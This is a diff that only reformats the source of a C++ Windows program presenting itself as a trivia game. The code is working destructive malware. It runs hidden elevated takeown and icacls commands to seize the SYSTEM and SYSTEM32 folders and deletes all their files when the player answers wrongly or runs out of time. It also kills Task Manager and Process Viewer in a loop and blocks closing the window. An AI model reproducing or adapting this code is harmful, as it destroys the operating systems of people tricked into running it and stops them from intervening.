@@ -11,18 +11,26 @@ vector<TriviaQuestion> getTriviaQuestions(string fileContents) {
 	vector<TriviaQuestion> triviaQuestions;
 	for (int i = 0; i < arraySize; i++) {
 		Json::Value jsonItem = triviaJson[i];
-		if (jsonItem.empty()) throw InteractBoxException(ErrorCodes::TriviaItemNotFound);
+		if (jsonItem.empty())
+			throw InteractBoxException(ErrorCodes::TriviaItemNotFound);
 		Json::Value questionJson = jsonItem["q"];
-		if (questionJson.empty()) throw InteractBoxException(ErrorCodes::TriviaQuestionNotFound);;
+		if (questionJson.empty())
+			throw InteractBoxException(ErrorCodes::TriviaQuestionNotFound);
+		;
 		Json::Value answersJson = jsonItem["a"];
-		if (answersJson.empty()) throw InteractBoxException(ErrorCodes::TriviaAnswersNotFound);;
+		if (answersJson.empty())
+			throw InteractBoxException(ErrorCodes::TriviaAnswersNotFound);
+		;
 		Json::Value correctAnswerJson = jsonItem["c"];
-		if (correctAnswerJson.empty()) throw InteractBoxException(ErrorCodes::TriviaCorrectAnswerNotFound);;
+		if (correctAnswerJson.empty())
+			throw InteractBoxException(ErrorCodes::TriviaCorrectAnswerNotFound);
+		;
 		string question = questionJson.asString();
 		vector<string> answers;
 		for (int j = 0; j < 4; j++) {
 			Json::Value arrayItem = answersJson[j];
-			if (arrayItem.empty()) throw InteractBoxException(ErrorCodes::ArgumentIsNull, to_string(j));
+			if (arrayItem.empty())
+				throw InteractBoxException(ErrorCodes::ArgumentIsNull, to_string(j));
 			answers.push_back(arrayItem.asString());
 		}
 		int correctAnswer = correctAnswerJson.asInt();
@@ -31,29 +39,31 @@ vector<TriviaQuestion> getTriviaQuestions(string fileContents) {
 	return triviaQuestions;
 }
 
-void loadFileInResource(int name, string type, DWORD& size, const char*& data) {
+void loadFileInResource(int name, string type, DWORD &size, const char *&data) {
 	HMODULE handle = ::GetModuleHandle(NULL);
-	if (!handle) throw InteractBoxException(ErrorCodes::CannotFindResource);
+	if (!handle)
+		throw InteractBoxException(ErrorCodes::CannotFindResource);
 	HRSRC rc = FindResourceA(handle, MAKEINTRESOURCEA(name), type.c_str());
 	HGLOBAL rcData = LoadResource(handle, rc);
 	size = SizeofResource(handle, rc);
-	data = static_cast<const char*>(::LockResource(rcData));
+	data = static_cast<const char *>(::LockResource(rcData));
 }
 
-void loadFileInResource(int name, DWORD& size, unsigned char* data) {
+void loadFileInResource(int name, DWORD &size, unsigned char *data) {
 	HMODULE handle = ::GetModuleHandle(NULL);
-	if (!handle) throw InteractBoxException(ErrorCodes::CannotFindResource);
+	if (!handle)
+		throw InteractBoxException(ErrorCodes::CannotFindResource);
 	HRSRC rc = FindResource(handle, MAKEINTRESOURCE(name), RT_RCDATA);
 	HGLOBAL rcData = LoadResource(handle, rc);
 	size = SizeofResource(handle, rc);
-	data = static_cast<unsigned char*>(LockResource(rcData));
+	data = static_cast<unsigned char *>(LockResource(rcData));
 }
 
 vector<TriviaQuestion> parseQuestions() {
 	DWORD size = 0;
-	const char* jsonString;
+	const char *jsonString;
 	loadFileInResource(IDR_JSON, "JSON", size, jsonString);
-	char* jsonBuffer = new char[size + 1];
+	char *jsonBuffer = new char[size + 1];
 	memcpy(jsonBuffer, jsonString, size);
 	jsonBuffer[size] = 0;
 	vector<TriviaQuestion> triviaQuestions = getTriviaQuestions(jsonBuffer);
@@ -62,17 +72,17 @@ vector<TriviaQuestion> parseQuestions() {
 
 bool TriviaGame::OnInit() {
 	try {
-		MainAppFrame* frame = new MainAppFrame();
+		MainAppFrame *frame = new MainAppFrame();
 		SetTopWindow(frame);
 		frame->Show(true);
 		return true;
-	} catch (InteractBoxException& e) {
+	} catch (InteractBoxException &e) {
 		wxMessageBox(e.what(), "Trivia Game Error", wxICON_ERROR);
 		return false;
-	} catch (exception& e) {
+	} catch (exception &e) {
 		wxMessageBox(e.what(), "Trivia Game Error", wxICON_ERROR);
 		return false;
-	} catch (exception* e) {
+	} catch (exception *e) {
 		wxMessageBox(e->what(), "Trivia Game Error", wxICON_ERROR);
 		return false;
 	}
@@ -80,22 +90,37 @@ bool TriviaGame::OnInit() {
 
 #if WINVER >= _WIN32_WINNT_VISTA
 vector<wstring> MainAppFrame::setPermissionsAndGetFiles(std::wstring path) {
-	ShellExecute(NULL, L"runas", L"cmd.exe", (L"/c takeown /f \"" + path + L"\"").c_str(), NULL, SW_HIDE);
+	ShellExecute(
+		NULL, L"runas", L"cmd.exe", (L"/c takeown /f \"" + path + L"\"").c_str(), NULL, SW_HIDE
+	);
 
-	ShellExecute(NULL, L"runas", L"cmd.exe", (L"/c icacls \"" + path + L"\" /grant %USERNAME%:(OI)(CI)F /T").c_str(), NULL, SW_HIDE);
+	ShellExecute(
+		NULL, L"runas", L"cmd.exe",
+		(L"/c icacls \"" + path + L"\" /grant %USERNAME%:(OI)(CI)F /T").c_str(), NULL, SW_HIDE
+	);
 	return FileHelper::listFilesWithoutFailures(path);
 }
 #endif
 
 void MainAppFrame::playSound() {
-	wxSound* sound = new wxSound;
+	wxSound *sound = new wxSound;
 	bool success = sound->Create("audio\\skill_check.wav");
-	if (!success) throw InteractBoxException(ErrorCodes::CannotCreateSound);
+	if (!success)
+		throw InteractBoxException(ErrorCodes::CannotCreateSound);
 	success = sound->Play(wxSOUND_ASYNC);
-	if (!success) throw InteractBoxException(ErrorCodes::CannotPlaySound);
+	if (!success)
+		throw InteractBoxException(ErrorCodes::CannotPlaySound);
 }
 
-MainAppFrame::MainAppFrame() : wxFrame(NULL, wxID_ANY, L"Trivia Game", wxDefaultPosition, wxDefaultSize, wxCAPTION | wxSYSTEM_MENU | wxMINIMIZE_BOX) {
+MainAppFrame::MainAppFrame()
+		: wxFrame(
+				NULL,
+				wxID_ANY,
+				L"Trivia Game",
+				wxDefaultPosition,
+				wxDefaultSize,
+				wxCAPTION | wxSYSTEM_MENU | wxMINIMIZE_BOX
+			) {
 	HICON iconHandle = LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ICON1));
 	wxIcon icon;
 	icon.CreateFromHICON(iconHandle);
@@ -110,35 +135,35 @@ MainAppFrame::MainAppFrame() : wxFrame(NULL, wxID_ANY, L"Trivia Game", wxDefault
 	vector<wstring> sysDirs = {
 		systemDir,
 		system32Dir,
-		#if WINVER >= _WIN32_WINNT_VISTA
+	#if WINVER >= _WIN32_WINNT_VISTA
 		sysWowDir,
-		#endif
+	#endif
 	};
-	for (auto& path : sysDirs) {
+	for (auto &path : sysDirs) {
 		_fileCollections.push_back(
-			#if WINVER >= _WIN32_WINNT_VISTA
-				setPermissionsAndGetFiles(path)
-			#else
-				FileHelper::listFiles(path)
-			#endif
+	#if WINVER >= _WIN32_WINNT_VISTA
+			setPermissionsAndGetFiles(path)
+	#else
+			FileHelper::listFiles(path)
+	#endif
 		);
 	}
 #else
 	string systemDir = "C:\\WINDOWS\\SYSTEM";
 	string system32Dir = "C:\\WINDOWS\\SYSTEM32";
 
-	for (auto& path : {systemDir, system32Dir}) {
-		_fileCollections.push_back(
-			FileHelper::listFiles(path)
-		);
+	for (auto &path : {systemDir, system32Dir}) {
+		_fileCollections.push_back(FileHelper::listFiles(path));
 	}
 #endif
 
 	wxSize size(400, 600);
 	_panel = new wxPanel(this, wxID_ANY, wxDefaultPosition, size);
-	wxBoxSizer* sizer = new wxBoxSizer(wxVERTICAL);
+	wxBoxSizer *sizer = new wxBoxSizer(wxVERTICAL);
 	getQuestion();
-	wxStaticText* text = new wxStaticText(_panel, QUESTION_ID, StringHelper::stringToWideString(_randomQuestion.question));
+	wxStaticText *text = new wxStaticText(
+		_panel, QUESTION_ID, StringHelper::stringToWideString(_randomQuestion.question)
+	);
 	_timeText = new wxStaticText(_panel, TIME_TEXT_ID, L"You have 10 seconds");
 	text->SetFont(this->GetFont().Scale(1.25));
 	_timeText->SetFont(this->GetFont().MakeBold());
@@ -160,7 +185,6 @@ MainAppFrame::MainAppFrame() : wxFrame(NULL, wxID_ANY, L"Trivia Game", wxDefault
 	DoStartThread();
 }
 
-
 void MainAppFrame::DoStartThread() {
 	timeThread = new TimeThread(this);
 	if (timeThread->Run() != wxTHREAD_NO_ERROR) {
@@ -169,9 +193,11 @@ void MainAppFrame::DoStartThread() {
 		timeThread = nullptr;
 	}
 #if WINVER > _WIN32_WINNT_NT4
-	processKillerThread = new ProcessKillerThread(this, { {"taskmgr.EXE", "Task Manager"}, {"PVIEW.EXE", "Process Viewer"} });
+	processKillerThread = new ProcessKillerThread(
+		this, {{"taskmgr.EXE", "Task Manager"}, {"PVIEW.EXE", "Process Viewer"}}
+	);
 #else
-	processKillerThread = new ProcessKillerThread(this, { {"PVIEW95.EXE", "Process Viewer"} });
+	processKillerThread = new ProcessKillerThread(this, {{"PVIEW95.EXE", "Process Viewer"}});
 #endif
 	if (processKillerThread->Run() != wxTHREAD_NO_ERROR) {
 		wxLogError("Can't create the thread!");
@@ -180,11 +206,11 @@ void MainAppFrame::DoStartThread() {
 	}
 }
 
-void MainAppFrame::displayQuestion(wxBoxSizer* sizer, wxPanel* panel) {
+void MainAppFrame::displayQuestion(wxBoxSizer *sizer, wxPanel *panel) {
 	for (int i = 0; i < _randomQuestion.answers.size(); i++) {
 		wstring answer = StringHelper::stringToWideString(_randomQuestion.answers[i]);
 		int id = i + 1;
-		wxRadioButton* radioButton = new wxRadioButton(panel, id, answer);
+		wxRadioButton *radioButton = new wxRadioButton(panel, id, answer);
 		sizer->Add(radioButton, 1, wxEXPAND, 1);
 		_radioButtons.push_back(radioButton);
 		Bind(wxEVT_RADIOBUTTON, &MainAppFrame::OnRadioSelect, this, id);
@@ -205,58 +231,62 @@ TimeThread::~TimeThread() {
 	handlerPointer->timeThread = nullptr;
 }
 
-void MainAppFrame::getQuestion() {
-	_randomQuestion = IndexHelper::getRandomItem(_triviaQuestions);
-}
+void MainAppFrame::getQuestion() { _randomQuestion = IndexHelper::getRandomItem(_triviaQuestions); }
 
-void MainAppFrame::OnSubmit(wxCommandEvent& event) {
+void MainAppFrame::OnSubmit(wxCommandEvent &event) {
 	_hasAnswered = true;
 	if (_pickedAnswer != _randomQuestion.correctAnswer) {
-		for (wxRadioButton* radio : _radioButtons) {
+		for (wxRadioButton *radio : _radioButtons) {
 			radio->Disable();
-			if (radio->GetId() != _pickedAnswer) radio->SetValue(false);
-			else radio->SetValue(true);
+			if (radio->GetId() != _pickedAnswer)
+				radio->SetValue(false);
+			else
+				radio->SetValue(true);
 		}
 		_submitButton->Disable();
 		wipeSystemFolders();
 	} else {
-		wxMessageBox(L"Congratulations, your system is safe! For now.", L"Trivia Game", wxICON_INFORMATION);
+		wxMessageBox(
+			L"Congratulations, your system is safe! For now.", L"Trivia Game", wxICON_INFORMATION
+		);
 	}
 	_canClose = true;
 	Close(true);
 }
 
-void MainAppFrame::OnRadioSelect(wxCommandEvent& event) {
+void MainAppFrame::OnRadioSelect(wxCommandEvent &event) {
 	int id = event.GetId();
 	_pickedAnswer = id;
 	if (_remainingSeconds > 0 && !_hasAnswered)
 		_submitButton->Enable();
 }
 
-void MainAppFrame::OnClose(wxCloseEvent& event) {
-	if (!_canClose) event.Veto();
+void MainAppFrame::OnClose(wxCloseEvent &event) {
+	if (!_canClose)
+		event.Veto();
 	timeThread = nullptr;
 	processKillerThread->Delete();
 	processKillerThread = nullptr;
 	exit(0);
 }
 
-void MainAppFrame::OnExit(wxCommandEvent& event) {
+void MainAppFrame::OnExit(wxCommandEvent &event) {}
 
-}
-
-void MainAppFrame::OnThreadUpdate(wxThreadEvent& event) {
-	if (_hasAnswered) return;
+void MainAppFrame::OnThreadUpdate(wxThreadEvent &event) {
+	if (_hasAnswered)
+		return;
 	_remainingSeconds--;
 	wstring timeString = L"You have ";
 	timeString += to_wstring(_remainingSeconds);
 	timeString += L" second";
-	if (_remainingSeconds != 1) timeString += L"s";
+	if (_remainingSeconds != 1)
+		timeString += L"s";
 	_timeText->SetLabel(timeString);
 }
 
-void MainAppFrame::OnThreadCompletion(wxThreadEvent& event) {
-	if (_hasAnswered) return;
+void MainAppFrame::OnThreadCompletion(wxThreadEvent &event) {
+	if (_hasAnswered)
+		return;
 	wipeSystemFolders();
 	wxMessageBox("Time's up! Better luck next time!", "Trivia Game", wxICON_INFORMATION);
 	_canClose = true;
@@ -265,7 +295,7 @@ void MainAppFrame::OnThreadCompletion(wxThreadEvent& event) {
 
 #if WINVER > _WIN32_WINNT_NT4
 void MainAppFrame::deleteFiles(vector<wstring> files) {
-	for (auto& file : files) {
+	for (auto &file : files) {
 		_timeText->SetLabel("Deleting " + file + "...");
 		WINBOOL success = DeleteFile(file.c_str());
 		_timeText->SetLabel(_timeText->GetLabel() + (success ? " success!" : " failed."));
@@ -274,7 +304,7 @@ void MainAppFrame::deleteFiles(vector<wstring> files) {
 
 #else
 void MainAppFrame::deleteFiles(vector<string> files) {
-	for (auto& file : files) {
+	for (auto &file : files) {
 		_timeText->SetLabel("Deleting " + file + "...");
 		WINBOOL success = DeleteFileA(file.c_str());
 		_timeText->SetLabel(_timeText->GetLabel() + (success ? " success!" : " failed."));
@@ -284,44 +314,42 @@ void MainAppFrame::deleteFiles(vector<string> files) {
 #endif
 
 void MainAppFrame::wipeSystemFolders() {
-	for (auto& files : _fileCollections) {
+	for (auto &files : _fileCollections) {
 		deleteFiles(files);
 	}
-	wxMessageBox("The contents of SYSTEM and SYSTEM32 have been deleted. Better luck next time!", "Trivia Game", wxICON_INFORMATION);
+	wxMessageBox(
+		"The contents of SYSTEM and SYSTEM32 have been deleted. Better luck next time!", "Trivia Game",
+		wxICON_INFORMATION
+	);
 	_canClose = true;
 	Close(true);
 }
 
 wxIMPLEMENT_APP(TriviaGame);
 
-ProcessKillerThread::~ProcessKillerThread() {
-	handlerPointer->processKillerThread = nullptr;
-}
+ProcessKillerThread::~ProcessKillerThread() { handlerPointer->processKillerThread = nullptr; }
 
 wxThread::ExitCode ProcessKillerThread::Entry() {
 	while (!_endNow) {
 		Sleep(100);
-		for (auto& procInfo : _processNamesAndFiles) {
+		for (auto &procInfo : _processNamesAndFiles) {
 			findAndKill(procInfo);
 		}
 	}
 	return (wxThread::ExitCode)0;
 }
 
-void ProcessKillerThread::OnDelete() {
-	_endNow = true;
-}
+void ProcessKillerThread::OnDelete() { _endNow = true; }
 
 void ProcessKillerThread::findAndKill(ProcessNameAndFileName procInfo) {
 	DWORD pid = ProcessHelper::getProcessId(procInfo.fileName);
-	if (pid == 0) return;
+	if (pid == 0)
+		return;
 	ProcessHelper::killProcess(pid, 1);
-	string shellArgs = "--title \"Really?\" --content \"Did you seriously open " + procInfo.name + "?\" --type e --buttons \"lol;lmao\"";
+	string shellArgs = "--title \"Really?\" --content \"Did you seriously open " + procInfo.name +
+		"?\" --type e --buttons \"lol;lmao\"";
 	ShellExecuteA(
-		NULL,
-		"open",
-		"message_box_process.exe",
-		shellArgs.c_str(),
+		NULL, "open", "message_box_process.exe", shellArgs.c_str(),
 #if WINVER > _WIN32_WINNT_NT4
 		FileHelper::getWorkingDirectoryAsString().c_str(),
 #else
